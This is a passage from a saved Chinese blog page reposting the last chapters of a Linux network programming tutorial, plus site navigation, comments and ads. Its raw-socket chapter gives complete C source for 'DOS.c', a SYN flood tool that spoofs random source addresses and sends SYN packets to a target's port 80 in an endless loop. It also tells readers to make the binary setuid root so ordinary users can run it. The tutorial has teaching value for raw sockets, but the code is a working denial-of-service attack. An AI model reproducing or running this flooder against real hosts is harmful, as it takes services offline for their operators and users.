+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(listen_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; n=read(accept_fd,buffer,1024);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(accept_fd,buffer,n);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(accept_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<br>&nbsp;&nbsp; }<br>&nbsp;&nbsp; else if(n&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Fork Error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp; close(accept_fd);<br>&nbsp; }<br>} </p>
+<p>你可以用我们前面写客户端程序来调试着程序,或者是用来telnet调试</p>
+<p><br>(十)Linux网络编程--10. 原始套接字</p>
+<p>&nbsp;我们在前面已经学习过了网络程序的两种套接字(SOCK_STREAM,SOCK_DRAGM).在这一章 里面我们一起来学习另外<br>一种套接字--原始套接字(SOCK_RAW). 应用原始套接字,我们可以编写出由TCP和UDP套接字不能够实现的功能. <br>注意原始套接字只能够由有 root权限的人创建. </p>
+<p>10.1 原始套接字的创建 </p>
+<p>int sockfd(AF_INET,SOCK_RAW,protocol)</p>
+<p>可以创建一个原始套接字.根据协议的类型不同我们可以创建不同类型的原始套接字 比如:IPPROTO_ICMP,IPPROTO_TCP,IPPROTO_UDP等等.<br>详细的情况查看 socket的man手册 下面我们以一个实例来说明原始套接字的创建和使用 </p>
+<p>10.2 一个原始套接字的实例 <br>还记得DOS是什么意思吗?在这里我们就一起来编写一个实现DOS的小程序. 下面是程序的源代码 </p>
+<p>/********************&nbsp; 
+DOS.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ *****************/<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;</p>
+<p>#define DESTPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+要攻击的端口(WEB)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>#define LOCALPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8888</p>
+<p>void send_tcp(int sockfd,struct sockaddr_in *addr);<br>unsigned short check_sum(unsigned short *addr,int len);</p>
+<p>int main(int argc,char **argv)<br>{<br>int sockfd;<br>struct sockaddr_in addr;<br>struct hostent *host;<br>int on=1;</p>
+<p>if(argc!=2)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>}</p>
+<p>bzero(&amp;addr,sizeof(struct sockaddr_in));<br>addr.sin_family=AF_INET;<br>addr.sin_port=htons(DESTPORT);</p>
+<p>if(inet_aton(argv[1],&amp;addr.sin_addr)==0)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host=gethostbyname(argv[1]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(host==NULL)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addr.sin_addr=*(struct in_addr *)(host-&gt;h_addr_list[0]);<br>}</p>
+<p>/**** 使用IPPROTO_TCP创建一个TCP的原始套接字&nbsp;&nbsp;&nbsp; ****/</p>
+<p>sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);<br>if(sockfd&lt;0)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>}<br>/********&nbsp; 设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写&nbsp; ***/</p>
+<p>setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,sizeof(on));</p>
+<p>/****&nbsp; 没有办法,只用超级护用户才可以使用原始套接字&nbsp;&nbsp;&nbsp; *********/<br>setuid(getpid());</p>
+<p>/*********&nbsp; 发送炸弹了!!!!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ****/<br>send_tcp(sockfd,&amp;addr);<br>} </p>
+<p>&nbsp;</p>
+<p>/*******&nbsp; 发送炸弹的实现&nbsp;&nbsp; *********/<br>void send_tcp(int sockfd,struct sockaddr_in *addr)<br>{<br>char buffer[100];&nbsp; /**** 用来放置我们的数据包&nbsp; ****/<br>struct ip *ip;<br>struct tcphdr *tcp;<br>int head_len;</p>
+<p>/******* 我们的数据包实际上没有任何内容,所以长度就是两个结构的长度&nbsp; ***/</p>
+<p>head_len=sizeof(struct ip)+sizeof(struct tcphdr);</p>
+<p>bzero(buffer,100);</p>
+<p>/********&nbsp; 填充IP数据包的头部,还记得IP的头格式吗?&nbsp;&nbsp;&nbsp;&nbsp; ******/ <br>ip=(struct ip *)buffer;<br>ip-&gt;ip_v=IPVERSION;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 版本一般的是 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **/<br>ip-&gt;ip_hl=sizeof(struct ip)&gt;&gt;2; /** IP数据包的头部长度&nbsp; **/<br>ip-&gt;ip_tos=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 
+服务类型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+**/<br>ip-&gt;ip_len=htons(head_len);&nbsp;&nbsp;&nbsp;&nbsp; /** IP数据包的长度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **/<br>ip-&gt;ip_id=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 让系统去填写吧&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **/<br>ip-&gt;ip_off=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 和上面一样,省点时间 **/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>ip-&gt;ip_ttl=MAXTTL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 最长的时间&nbsp;&nbsp; 255&nbsp;&nbsp;&nbsp; **/<br>ip-&gt;ip_p=IPPROTO_TCP;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /** 我们要发的是 TCP包&nbsp; **/ <br>ip-&gt;ip_sum=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 校验和让系统去做&nbsp;&nbsp;&nbsp; **/<br>ip-&gt;ip_dst=addr-&gt;sin_addr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /** 我们攻击的对象&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **/</p>
+<p>/*******&nbsp; 
+开始填写TCP数据
+包&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ *****/<br>tcp=(struct tcphdr *)(buffer +sizeof(struct ip));<br>tcp-&gt;source=htons(LOCALPORT);<br>tcp-&gt;dest=addr-&gt;sin_port;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /** 目的端口&nbsp;&nbsp;&nbsp; **/<br>tcp-&gt;seq=random();<br>tcp-&gt;ack_seq=0;<br>tcp-&gt;doff=5;<br>tcp-&gt;syn=1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /** 我要建立连接 **/<br>tcp-&gt;check=0;</p>
+<p><br>/** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^&nbsp; **/<br>while(1)<br>&nbsp; {<br>/**&nbsp; 你不知道我是从那里来的,慢慢的去等吧!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **/<br>&nbsp;&nbsp;&nbsp; ip-&gt;ip_src.s_addr=random();&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>/** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧 */<br>/**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 下面这条可有可无&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp; tcp-&gt;check=check_sum((unsigned short *)tcp,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(struct tcphdr)); <br>&nbsp;&nbsp;&nbsp; sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));<br>&nbsp; }<br>}</p>
+<p>/* 下面是首部校验和的算法,偷了别人的 */<br>unsigned short check_sum(unsigned short *addr,int len)<br>{<br>register int nleft=len;<br>register int sum=0;<br>register short *w=addr;<br>&nbsp; short answer=0;</p>
+<p>while(nleft&gt;1)<br>{<br>&nbsp; sum+=*w++;<br>&nbsp; nleft-=2;<br>}<br>if(nleft==1)<br>{<br>&nbsp; *(unsigned char *)(&amp;answer)=*(unsigned char *)w;<br>&nbsp; sum+=answer;<br>}<br>&nbsp; <br>sum=(sum&gt;&gt;16)+(sum&amp;0xffff);<br>sum+=(sum&gt;&gt;16);<br>answer=~sum;<br>return(answer);<br>}</p>
+<p>编译一下,拿localhost做一下实验,看看有什么结果.(千万不要试别人的啊). 为了让普通用户可以运行这个程序,<br>我们应该将这个程序的所有者变为root,且 设置setuid位 </p>
+<p>[root@hoyt /root]#chown root DOS<br>[root@hoyt /root]#chmod +s DOS</p>
+<p><br>10.3 总结 <br>原始套接字和一般的套接字不同的是以前许多由系统做的事情,现在要由我们自己来做了. 不过这里面是不是有很多的乐趣呢. <br>当我们创建了一个 TCP套接字的时候,我们只是负责把我们要发送的内容(buffer)传递给了系统. 系统在收到我们的数据后,<br>回自动的调用相应的模块给数据加上TCP 头部,然后加上IP头部. 再发送出去.而现在是我们自己创建各个的头部,系统只是把它们<br>发送出去. 在上面的实例中,由于我们要修改我们的源IP地址, 所以我们使用了setsockopt函数,如果我们只是修改TCP数据,<br>那么IP数据一样也可以由系统来创建的. </p>
+<p><br>11. 后记<br>&nbsp; 总算完成了网络编程这个教程.算起来我差不多写了一个星期,原来以为写这个应该是一件 不难的事,做起来才知道原来有很多的地方<br>都比我想象的要难.我还把很多的东西都省略掉了 不过写完了这篇教程以后,我好象对网络的认识又增加了一步. <br>&nbsp; 如果我们只是编写一般的 网络程序还是比较容易的,但是如果我们想写出比较好的网络程序我们还有着遥远的路要走. <br>&nbsp; 网络程序一般的来说都是多进程加上多线程的.为了处理好他们内部的关系,我们还要学习 进程之间的通信.在网络程序里面有着许<br>&nbsp; 许多多的突发事件,为此我们还要去学习更高级的 事件处理知识.现在的信息越来越多了,为了处理好这些信息,我们还要去学习数据库.<br>&nbsp; 如果要编写出有用的黑客软件,我们还要去熟悉各种网络协议.总之我们要学的东西还很多很多. <br>&nbsp; 看一看外国的软件水平,看一看印度的软件水平,宝岛台湾的水平,再看一看我们自己的 软件水平大家就会知道了什么叫做差距.<br>&nbsp; 我们现在用的软件有几个是我们中国人自己编写的.&nbsp; 不过大家不要害怕,不用担心.只要我们还是清醒的,还能够认清我们和别人的<br>&nbsp; 差距, 我们就还有希望. 毕竟我们现在还年轻.只要我们努力,认真的去学习,我们一定能够学好的.我们就可以追上别人直到超过别人! </p>
+<p>相信一点: </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 别人可以做到的我们一样可以做到,而且可以比别人做的更好! </p>
+<p>&nbsp;&nbsp; 勇敢的年轻人,为了我们伟大祖国的软件产业,为了祖国的未来,努力的去奋斗吧!祖国会记住你们的! </p>
+<p>&nbsp;</p>
+<p>本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/jenshy/archive/2006/04/18/667944.aspx</p></div><div id="MySignature"></div>
+<script type="text/javascript">
+var isLogined = false;
+var cb_blogId = 47552;
+var cb_entryId = 1506699;
+var cb_blogApp = currentBlogApp;
+var cb_blogUserGuid = "8300470b-63cf-dd11-9e4d-001cf0cd104b";
+var cb_entryCreatedDate = '2009/6/19 13:13:00';
+var enableGoogleAd = true;
+var googletag = googletag || {};
+googletag.cmd = googletag.cmd || [];
+</script>
+<div id="blog_post_info_block">
+<div id="blog_post_info"><div id="BlogPostCategory">分类: <a href="http://www.cnblogs.com/duzouzhe/category/166861.html">网络编程</a></div>
+<div id="EntryTag"></div>
+<div id="green_channel">
+绿色通道：
+<a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(cb_entryId,cb_blogId,1);green_channel_success(this,'谢谢推荐！');">好文要顶</a>
+<a id="green_channel_follow" onclick="c_follow();" href="javascript:void(0);">关注我</a>
+<a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a><a id="green_channel_contact" href="http://space.cnblogs.com/msg/send/%e7%8b%ac%e5%a5%8f%e8%80%85" target="_blank">与我联系</a>
+<a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/icon_weibo_24.png" alt=""></a>
+</div>
+<div id="digg_block">
+<div id="author_profile">
+<div id="author_profile_info" class="author_profile_info">
+<div id="author_profile_detail" class="author_profile_info">
+<a href="http://home.cnblogs.com/u/duzouzhe/">独奏者</a><br>
+<a href="http://home.cnblogs.com/u/duzouzhe/followees">关注 - 2</a><br>
+<a href="http://home.cnblogs.com/u/duzouzhe/followers">粉丝 - 22</a>
+</div>
+</div>
+<div class="clear"></div>
+<div id="author_profile_honor"></div>
+<div id="author_profile_follow">
+<a href="javascript:void(0);" onclick="c_follow();return false;">+加关注</a>
+</div>
+</div>
+<div id="div_digg">										
+	<div class="diggit" onclick="votePost(cb_entryId,'Digg')"> 
+		<span class="diggnum" id="digg_count">2</span>
+	</div>
+	<div class="buryit" onclick="votePost(cb_entryId,'Bury')"> 
+		<span class="burynum" id="bury_count">0</span>
+	</div>
+	<div class="clear"></div>	
+	<div class="diggword" id="digg_tips">
+    (请您对文章做出评价)
+    </div>	
+</div>
+</div></div>
+<div class="clear"></div>
+<div id="post_next_prev"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506686.html" class="p_n_p_prefix">« </a> 博主前一篇：<a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506686.html" title="发布于2009-06-19 12:55">限速代码 (转CSDN贴)</a><br><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/20/1507238.html" class="p_n_p_prefix">» </a> 博主后一篇：<a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/20/1507238.html" title="发布于2009-06-20 10:14">COM组件设计与应用（三）(转载)</a><br></div>
+</div>
+<script type="text/javascript">
+    //SyntaxHighlighter.config.strings.expandSource = '<span><img src="http://static.cnblogs.com/images/expand-code.gif" alt="" class="expand-code-icon"/>View Code</span>';
+    $(function () {             
+        fixPostBodyFormat();
+        loadAdUnderPost();
+        loadBlogSignature();
+        LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+        GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);        
+        GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);        
+    });
+</script>
+		</div>
+		<div class="postDesc">posted @ <span id="post-date">2009-06-19 13:13</span> <a href="http://www.cnblogs.com/duzouzhe/">独奏者</a> 阅读(15336) 评论(<span id="post-comment-count">1</span>)  <a href="http://www.cnblogs.com/duzouzhe/admin/EditPosts.aspx?postid=1506699" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(1506699);return false;">收藏</a></div>
+	</div>
+	<img src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/1506699.jpg" alt="" height="1" width="1">
+	
+</div><!--end: topics 文章、评论容器-->
+<div id="blog-comments-placeholder"><div id="comments_pager_top"></div>
+<!--done-->
+<br>
+<div class="feedback_area_title">发表评论</div>
+<div class="feedbackNoItems"></div>
+	
+
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;<span class="comment_actions"></span>
+				</div>
+				<a href="#2471058" class="layer">#1楼</a><a name="2471058" id="comment_anchor_2471058"></a><span id="comment-maxId" style="display:none;">2471058</span><span id="comment-maxDate" style="display:none;">2012/9/12 18:38:27</span> <span class="comment_date">2012-09-12 18:38</span> | <a id="a_comment_author_2471058" href="http://home.cnblogs.com/u/380608/" target="_blank">boyfood</a> <a href="http://space.cnblogs.com/msg/send/boyfood" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
+			</div>
+			<div class="feedbackCon">
+				<div id="comment_body_2471058" class="blog_comment_body">很好的文章</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(2471058,'Digg',this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(2471058,'Bury',this)">反对(0)</a></div><br>
+			</div>
+		</div>
+	<div id="comments_pager_bottom"></div></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.loadComments();</script>
+<div id="comment_form" class="commentform">
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"><div class="login_tips">注册用户登录后才能发表评论，请 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login('commentform');">登录</a> 或 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，<a href="http://www.cnblogs.com/">访问</a>网站首页。</div></div>
+
+<script type="text/javascript">
+    if (typeof commentManager === 'undefined') {
+        commentManager = new blogCommentManager();
+    }
+    commentManager.loadCommentForm();   
+</script>
+
+<div class="ad_text_commentbox"><a href="http://q.cnblogs.com/" target="_blank">程序员问答社区，解决您的技术难题</a></div>
+<div id="site_nav_under"><a href="http://www.cnblogs.com/" target="_blank" title="程序员的网上家园">博客园首页</a><a href="http://q.cnblogs.com/" target="_blank" title="程序员问答社区">博问</a><a href="http://news.cnblogs.com/" target="_blank" title="IT新闻">新闻</a><a href="http://home.cnblogs.com/ing/" target="_blank">闪存</a><a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a><a href="http://kb.cnblogs.com/" target="_blank">知识库</a></div>
+<div id="ad_under_post_holder">
+<div id="google_ad_c1" class="c_ad_block">
+<div id="div-gpt-ad-1320933818841-0" style="width: 300px; height: 250px;">
+
+<iframe style="border: 0px none;" marginheight="0" marginwidth="0" name="google_ads_iframe_/1090369/cnblogs_blogpost_C1_0" id="google_ads_iframe_/1090369/cnblogs_blogpost_C1_0" frameborder="0" height="250" scrolling="no" width="300"></iframe><iframe style="border: 0px none; visibility: hidden; display: none;" marginheight="0" marginwidth="0" name="google_ads_iframe_/1090369/cnblogs_blogpost_C1_0__hidden__" id="google_ads_iframe_/1090369/cnblogs_blogpost_C1_0__hidden__" frameborder="0" height="0" scrolling="no" width="0"></iframe></div>
+</div>
+<div id="blog_news_kb"><div class="itnews c_ad_block"><b>最新IT新闻</b>:<br> ·  <a href="http://news.cnblogs.com/n/161340/" target="_blank">美国市场遭逆袭？微软WP8首发将华为排除在外</a><br> ·  <a href="http://news.cnblogs.com/n/161339/" target="_blank">科技正在影响教育行业 教师职业面临威胁</a><br> ·  <a href="http://news.cnblogs.com/n/161338/" target="_blank">百度布局O2O：分拆LBS事业部 爱乐活陷尴尬</a><br> ·  <a href="http://news.cnblogs.com/n/161337/" target="_blank">RIM在应用开发者和企业管理者中仍有粉丝</a><br> ·  <a href="http://news.cnblogs.com/n/161336/" target="_blank">盛大果壳郭朝晖确认辞职 自称因家庭原因</a><br>» <a href="http://news.cnblogs.com/" title="IT新闻" target="_blank">更多新闻...</a></div><div class="itnews c_ad_block" id="kb_block"><b>最新知识库文章</b>:<br><div id="kb_recent"> ·  <a href="http://kb.cnblogs.com/page/161000/" target="_blank">十八年开发经历小结</a><br> ·  <a href="http://kb.cnblogs.com/page/161169/" target="_blank">RAID10与RAID5的区别比较，利用率与安全的取舍</a><br> ·  <a href="http://kb.cnblogs.com/page/161050/" target="_blank">领域驱动设计(Domain Driven Design)参考架构详解</a><br> ·  <a href="http://kb.cnblogs.com/page/160804/" target="_blank">IT人，请爱惜你的身体</a><br> ·  <a href="http://kb.cnblogs.com/page/160717/" target="_blank">编程离软件工程有多远？</a><br></div>» <a href="http://kb.cnblogs.com/" target="_blank">更多知识库文章...</a></div></div>
+<div id="google_ad_c2" class="c_ad_block">
+<div id="div-gpt-ad-1320933818841-1" style="width: 468px; height: 60px;">
+
+<iframe style="border: 0px none;" marginheight="0" marginwidth="0" name="google_ads_iframe_/1090369/cnblogs_blogpost_C2_0" id="google_ads_iframe_/1090369/cnblogs_blogpost_C2_0" frameborder="0" height="60" scrolling="no" width="468"></iframe></div>
+</div>
+<div id="ad_under_google" class="c_ad_block">
+<a href="http://www.china-pub.com/static07/1206/12znq_dyb_20120618/12znq_dyb_20120618.asp" target="_blank" rel="nofollow"><img src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/china-pub-0620.jpg" alt="" style="border:0px;"></a><br>
+<a href="http://www.china-pub.com/sale/usedbook.aspx" target="_blank" rel="nofollow">China-Pub 低价书精选</a><br>
+<a href="http://www.china-pub.com/static07/0901/zh_jueba_090121.asp" target="_blank" rel="nofollow">China-Pub 计算机绝版图书按需印刷服务</a>
+</div></div>
+<div id="HistoryToday" class="c_ad_block"></div>
+</div>
+
+
+
+
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+	<div id="blog-news"><div id="profile_block">昵称：<a href="http://home.cnblogs.com/u/duzouzhe/">独奏者</a><br>园龄：<a href="http://home.cnblogs.com/u/duzouzhe/" title="入园时间：2008-11-14">3年11个月</a><br>粉丝：<a href="http://home.cnblogs.com/u/duzouzhe/followers/">22</a><br>关注：<a href="http://home.cnblogs.com/u/duzouzhe/followees/">2</a><div id="p_b_follow"><a href="javascript:void(0);" onclick="cnblogs.UserManager.FollowBlogger('8300470b-63cf-dd11-9e4d-001cf0cd104b')">+加关注</a></div></div></div>
+</div>
+
+			<div id="calendar"><div id="blog-calendar" style="displya:none"><table id="blogCalendar" class="Cal" title="Calendar" cellpadding="0" cellspacing="0">
+	<tbody><tr><td colspan="7"><table class="CalTitle" cellspacing="0">
+		<tbody><tr><td class="CalNextPrev"><a href="javascript:void(0);" onclick="loadBlogCalendar('2009/05/01');return false;">&lt;</a></td><td align="center">2009年6月</td><td class="CalNextPrev" align="right"><a href="javascript:void(0);" onclick="loadBlogCalendar('2009/07/01');return false;">&gt;</a></td></tr>
+	</tbody></table></td></tr><tr><th class="CalDayHeader" abbr="日" scope="col" align="center">日</th><th class="CalDayHeader" abbr="一" scope="col" align="center">一</th><th class="CalDayHeader" abbr="二" scope="col" align="center">二</th><th class="CalDayHeader" abbr="三" scope="col" align="center">三</th><th class="CalDayHeader" abbr="四" scope="col" align="center">四</th><th class="CalDayHeader" abbr="五" scope="col" align="center">五</th><th class="CalDayHeader" abbr="六" scope="col" align="center">六</th></tr><tr><td class="CalOtherMonthDay" align="center">31</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/04.html"><u>4</u></a></td><td align="center">5</td><td class="CalWeekendDay" align="center">6</td></tr><tr><td class="CalWeekendDay" align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td align="center">11</td><td align="center">12</td><td class="CalWeekendDay" align="center">13</td></tr><tr><td class="CalWeekendDay" align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/14.html"><u>14</u></a></td><td align="center">15</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/16.html"><u>16</u></a></td><td align="center">17</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/18.html"><u>18</u></a></td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19.html"><u>19</u></a></td><td class="CalWeekendDay" align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/20.html"><u>20</u></a></td></tr><tr><td class="CalWeekendDay" align="center">21</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/22.html"><u>22</u></a></td><td align="center">23</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/24.html"><u>24</u></a></td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/25.html"><u>25</u></a></td><td align="center">26</td><td class="CalWeekendDay" align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/27.html"><u>27</u></a></td></tr><tr><td class="CalWeekendDay" align="center">28</td><td align="center">29</td><td align="center"><a href="http://www.cnblogs.com/duzouzhe/archive/2009/06/30.html"><u>30</u></a></td><td class="CalOtherMonthDay" align="center">1</td><td class="CalOtherMonthDay" align="center">2</td><td class="CalOtherMonthDay" align="center">3</td><td class="CalOtherMonthDay" align="center">4</td></tr><tr><td class="CalOtherMonthDay" align="center">5</td><td class="CalOtherMonthDay" align="center">6</td><td class="CalOtherMonthDay" align="center">7</td><td class="CalOtherMonthDay" align="center">8</td><td class="CalOtherMonthDay" align="center">9</td><td class="CalOtherMonthDay" align="center">10</td><td class="CalOtherMonthDay" align="center">11</td></tr>
+</tbody></table></div></div>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn">
+
+<div class="mySearch">
+<h3 class="catListTitle">搜索</h3>
+<div id="widget_my_zzk" class="div_my_zzk"><input id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk" type="text">&nbsp;<input onclick="zzk_go()" value="找找看" id="btnZzk" class="btn_my_zzk" type="button"></div>
+<div id="widget_my_google" class="div_my_zzk"><input name="google_q" id="google_q" onkeydown="return google_go_enter(event)" class="input_my_zzk" type="text">&nbsp;<input onclick="google_go()" value="谷歌搜索" class="btn_my_zzk" type="button"></div>
+</div>
+
+
+<div class="catListLink">
+<h3 class="catListTitle">常用链接</h3>
+<ul>
+
+		<li><a id="ctl01_rptMainLinks_lnkLinkItem_0" href="http://www.cnblogs.com/duzouzhe/MyPosts.html">我的随笔</a></li>
+	
+		<li><a id="ctl01_rptMainLinks_lnkLinkItem_1" href="http://www.cnblogs.com/duzouzhe/MyComments.html">我的评论</a></li>
+	
